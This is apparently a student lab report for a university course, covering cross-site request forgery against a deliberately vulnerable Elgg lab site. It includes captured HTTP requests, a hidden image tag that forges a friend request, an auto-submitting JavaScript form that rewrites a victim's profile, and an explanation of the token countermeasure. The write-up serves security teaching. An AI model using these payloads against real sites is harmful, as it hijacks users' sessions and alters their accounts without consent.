# CS 4173 Lab 4
#### Cross-Site Request Forgery Attack Lab

## Prerequisites
Versions of software used listed here:
- Environment: SEEDUbuntu 16.04

## Task 1: Observing HTTP Request

In this task, we use the [HTTP Header Live](https://addons.mozilla.org/en-US/firefox/addon/http-header-live/) addon for Firefox in order to observe the structure of the HTTP requests and responses of the `Elgg` social network. Below is a GET request:

```
http://www.csrflabelgg.com/profile/alice
Host: www.csrflabelgg.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.csrflabelgg.com/activity
Cookie: Elgg=q1402do2898g8cc1u0kj2frkp0
Connection: keep-alive
Upgrade-Insecure-Requests: 1

GET: HTTP/1.1 200 OK
Date: Fri, 09 Nov 2018 00:17:06 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-Frame-Options: SAMEORIGIN
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 3408
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

This is a simple GET request of viewing Alice's profile page. The main parameters used are the identifying cookie as the browser is simply requesting information. Looking at a POST request:

```
http://www.csrflabelgg.com/action/profile/edit
POST HTTP/1.1 302 Found
Host:www.csrflabelgg.com
User-Agent:Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language:en-US,en;q=0.5
Accept-Encoding:gzip, deflate
Referer:http://www.csrflabelgg.com/profile/boby/edit
Content-Type:application/x-www-form-urlencoded
Content-Length:501
Cookie:Elgg=lh9gb6ba2qp7cdkhaqqibbofj5
Connection:keep-alive
Upgrade-Insecure-Requests:1

__elgg_token=RhUAi0XTAlxiX7zLFRQMDA&__elgg_ts=1542101139&name=Boby&description=<p>I am bobys</p>
&accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid=43

Date:Tue, 13 Nov 2018 09:25:46 GMT
Server:Apache/2.4.18 (Ubuntu)
Expires:Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control:no-store, no-cache, must-revalidate
Pragma:no-cache
Location:http://www.csrflabelgg.com/profile/boby
Content-Length:0
Keep-Alive:timeout=5, max=100
Connection:Keep-Alive
Content-Type:text/html;charset=utf-8
```

This time we see a little more information. Along with the cookie, we also see the body of the POST request which contains the form data, in this case the data to update Boby's profile with. We see two special tokens for security as well the contents of each field in the form and the access display level of each field, and finally the `guid` of the user to be updated. 

## Task 2: CSRF Attack Using GET Request

In this task we will demonstrate a GET request attack to show how a GET request attack can be launched if the victim is directed to a malicious site. We can create a webpage in the directory for the csrflabattacker.com domain which has a hidden image with the `src` set to the URL we wish to attack and the GET request will be triggered automatically. The image tag used is the following: 

```html
<img src="http://www.csrflabelgg.com/action/friends/add?friend=42" alt="" style="position:absolute; left:-999999999999999999999999999999999999999px" width="1" height="1">
```

## Task 3: CSRF Attack Using POST Request

In this task we will demonstrate how a POST request can also be used to perform attacks against servers which are not protected against it. Using the same directory, we can modify the page to contain a script that will run and auto invoke itself upon loading the page. The script will create a form with a field to set the `description` field and the `accesslevel` for that field along with the `guid` of the target. The elgg token security has been disabled so the attack does not require those. When Alice reaches this page, her logged in session cookie is still in the browser and will allow the request to be sent and modifying her profile. 

![Screenshot of successful post attack](post-attack.png "Alice's profile after redirecting back from the attacker's site")

The script on the page consists of the following:

```js
function forge_post() {
    var fields;
    // The following are form entries need to be filled out by attackers.
    // The entries are made hidden, so the victim won't be able to see them.
    fields += "<input type='hidden' name='name' value='Alice'>";
    fields += "<input type='hidden' name='briefdescription' value=''>";
    fields += "<input type='hidden' name='accesslevel[briefdescription]' value ='2'> ";
    fields += "<input type='hidden' name='description' value='<p>Boby is my Hero</p>'>";
    fields += "<input type='hidden' name='accesslevel[description]' value='2'>";

    fields += "<input type='hidden' name='guid' value='42'>";
    // Create a <form> element.
    var p = document.createElement("form");
    // Construct the form
    p.action = "http://www.csrflabelgg.com/action/profile/edit";
    p.innerHTML = fields;
    p.method = "post";
    // Append the form to the current page.
    document.body.appendChild(p);
    // Submit the form
    p.submit();
}
// Invoke forge_post() after the page is loaded.
window.onload = function () { forge_post(); }
```

### Question 1

Boby cannot retrieve Alice's `guid` by logging into her account, but fortunately he does not need to. By visiting Alice's page as a visitor, he can inspect the "Add friend" button which contains her `guid` in the GET request URL.

### Question 2

It is possible to retrieve the `guid` of anyone who visits the page, assuming they are logged in. One only needs to know their profile username in order to view their page and retrieve the `guid` from the "Add friend" button. This can be achieved by sending a malicious GET request to `http://www.csrflabelgg/profile` which will redirect to the logged in user's page which can be found in the response headers. The attacker can then pull that URL and retrieve the `guid`.

## Task 4: Implementing a countermeasure for `Elgg`

In this task, we re-enable the disabled CSRF countermeasures and retry the attacks. They now no longer work because the server now expects two extra values, the `__elgg_ts` and `__elgg_token` values in both the GET and POST for these tasks. There is no way for the attacker to know these values before hand since they are generated each time the page is loaded, and is different every time the page is visited. As long as the algorithm used to generate these values are secure enough, the attacker will not be able to predict these values and launch a CSRF attack.